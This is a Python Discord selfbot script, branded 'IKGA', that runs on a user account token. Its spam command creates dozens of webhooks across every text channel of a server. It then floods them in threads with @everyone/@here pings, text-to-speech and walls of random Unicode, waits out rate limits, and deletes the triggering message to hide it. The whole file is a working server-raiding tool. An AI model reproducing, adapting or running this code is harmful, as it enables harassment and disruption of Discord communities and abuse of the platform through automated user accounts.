import requests
import time
import sys
from random import randrange
from websocket import WebSocket
import subprocess
from concurrent.futures import ThreadPoolExecutor
from json import loads, dumps, load
import random, discord, threading, os, datetime, asyncio
from time import sleep
from colorama import init, Fore, Back, Style
from colorama import Fore
from pystyle import Colors, Colorate
from discord.ext import (commands)
from time import sleep
from requests import get
from subprocess import check_output
from os import system
from httpx import Client
import json


with open('config.json') as config_file:
    config = json.load(config_file)

color = 0x003240
under = "\n\n\n\n\n\n"
space = "                          "

token = config['token']
prefix = ("is!")



content = "@everyone @here"
description = "*"
image_url = "https://cdn.discordapp.com/attachments/1116055698569166878/1120453277516046446/Game_Logo.png"
webhook_name = "电脑电视机感冒流感手套帽子鞋子椅子衣服书本家庭自己丈夫 妻子"
webhook_title = "**电脑电视机感冒流感手套帽子鞋子椅子衣服书本家庭自己丈夫 妻子伯伯日用日用品纸巾剪刀钱包雨伞手帕梳子手日用品纸巾剪刀钱包雨伞手帕梳子手表杯子电话电脑电视机感冒流感手套帽子鞋子椅子衣服书本家庭自己丈夫 妻子伯伯日用日用品纸巾剪刀钱包雨伞手帕梳子手表杯子电话电脑电视机感冒流感手套帽子鞋子椅子衣服书本家庭自己丈夫 妻子伯伯日用日用品纸巾剪刀钱包雨伞手帕梳子手表杯子电话电脑电视机感冒流感手套帽子鞋子椅子衣服书本家庭自己丈夫 妻子伯伯日用**"
thumbnail_url = "https://media.discordapp.net/attachments/1116055698569166878/1116055828567429210/IKGA-SOURCE.gif?width=90&height=90"
thumbnail_url = "https://media.discordapp.net/attachments/1116055698569166878/1116055828567429210/IKGA-SOURCE.gif?width=90&height=90"
title_url = "https://media.discordapp.net/attachments/1116055698569166878/1116055828567429210/IKGA-SOURCE.gif?width=90&height=90"
icon_url = "https://media.discordapp.net/attachments/1116055698569166878/1116055828567429210/IKGA-SOURCE.gif?width=90&height=90"
avatar_url = "https://picsum.photos/id/{}/200".format(random.randint(1, 500)) #webhooks
footer = "*"


intents = discord.Intents.default()
intents.presences = True
intents.members = True
bot = discord.Client()
bot = commands.Bot(
    description='Selfbot',
    command_prefix=prefix,
    self_bot=True
)    

def asciigen(length):
    asc = ''
    for x in range(int(length)):
        num = randrange(13000)
        asc = asc + chr(num)
    return asc

@bot.event
async def UwUIsD():
    try:
        from pypresence import Presence
        import time

        RPC = Presence("1115699822889021481") 
        RPC.connect() 
        RPC.update(state="\nIKGA",buttons=[{"label":"Join Discord", "url":"https://discord.gg/ikgas"}], details="รูป",large_image="ikgas", start=time.time())
    except:pass


@bot.event
async def on_ready():
    os.system('cls')
    os.system(f'cls & title Webhook IKGAS') 
    print(Colorate.Horizontal(Colors.red_to_blue,f"""


                        ██╗██╗  ██╗ ██████╗  █████╗     ███████╗ ██████╗ ██╗   ██╗██████╗  ██████╗███████╗
                        ██║██║ ██╔╝██╔════╝ ██╔══██╗    ██╔════╝██╔═══██╗██║   ██║██╔══██╗██╔════╝██╔════╝
                        ██║█████╔╝ ██║  ███╗███████║    ███████╗██║   ██║██║   ██║██████╔╝██║     █████╗  
                        ██║██╔═██╗ ██║   ██║██╔══██║    ╚════██║██║   ██║██║   ██║██╔══██╗██║     ██╔══╝  
                        ██║██║  ██╗╚██████╔╝██║  ██║    ███████║╚██████╔╝╚██████╔╝██║  ██║╚██████╗███████╗
                        ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝    ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝


                                                                             [+] Token Login : {bot.user}
                                                                             [+] Perfix : {prefix}
        

            {space}.--------------------------.
            {space}|     [+] {prefix}spam          |
            {space}|     [-] {prefix}stop          |
            {space}'--------------------------'
"""))


def start():
    bot.run(token, bot=False, reconnect=True)

    

@bot.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        pass
    elif isinstance(error, commands.CheckFailure):
        pass
    elif isinstance(error, commands.MissingRequiredArgument):
        pass
    elif isinstance(error, discord.errors.Forbidden):
        pass
    elif "Cannot send an empty message" in error_str:
        pass
    else:
        pass



def webspam(webhook):
    global spammingdawebhookeroos
    while spammingdawebhookeroos:
        randcolor = random.randint(0x000001, 0x000002)
        data = {
          "content": f"{content}" + asciigen(1900),
          "embeds": [
            {
              "title": f"{webhook_title}",
              "tts": "true",
              "description": f"\n{description}" + asciigen(1900),
              "url": f"{image_url}",
              "author": {
                "name": f"{webhook_name}",
                "url": f"{title_url}",
                "icon_url": f"{icon_url}"
              },
              "footer": {
                "text": f"{footer}",
                "icon_url": f"{icon_url}"
              },
              "image": {
                "url": f"{image_url}"
              },
              "thumbnail": {
                "url": f"{thumbnail_url}"
              }
            }
          ],
          "username": f"{webhook_name}",
          "avatar_url": f"{avatar_url}",
          "tts": True
        }
        spamming = requests.post(webhook, json=data)  
        spammingerror = spamming.text
        if spamming.status_code == 204:
            pass
        elif "rate limited" in spammingerror.lower():
            try:
                j = loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 5000
                sleep(timetowait)
            except:
                delay = random.randint(10, 20)
                sleep(delay)
        else:
            delay = random.randint(50, 100)
            sleep(delay)


@bot.command()
async def spam(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target = webspam, args = (webhook.url,)).start()
    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 50 / len(ctx.guild.text_channels) 
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            webhook =await channel.create_webhook(name=f"{str(webhook_name)}")
            threading.Thread(target = webspam, args = (webhook.url,)).start()


@bot.command()
async def stop(ctx):
    await ctx.message.delete()
    global spammingdawebhookeroos
    spammingdawebhookeroos = False


start()
